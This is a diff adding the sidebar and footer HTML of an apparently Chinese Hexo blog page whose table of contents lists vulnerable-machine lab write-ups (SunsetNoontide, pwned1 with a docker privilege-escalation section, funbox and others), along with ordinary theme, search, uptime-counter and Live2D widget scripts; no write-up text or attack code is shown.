+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SunsetNoontide"><span class="nav-number">1.</span> <span class="nav-text">SunsetNoontide</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pyexp-1"><span class="nav-number">2.</span> <span class="nav-text">pyexp: 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Btrsys-2"><span class="nav-number">3.</span> <span class="nav-text">Btrsys-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwned1"><span class="nav-number">4.</span> <span class="nav-text">pwned1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#docker-%E6%8F%90%E6%9D%83"><span class="nav-number">4.1.</span> <span class="nav-text">docker 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#funbox"><span class="nav-number">5.</span> <span class="nav-text">funbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#icmp"><span class="nav-number">6.</span> <span class="nav-text">icmp</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="小zhou"
+      src="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+  <p class="site-author-name" itemprop="name">小zhou</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小zhou</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">67k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:05</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/clicklove.js"></script>
+<script src="/js/sakura.js"></script>
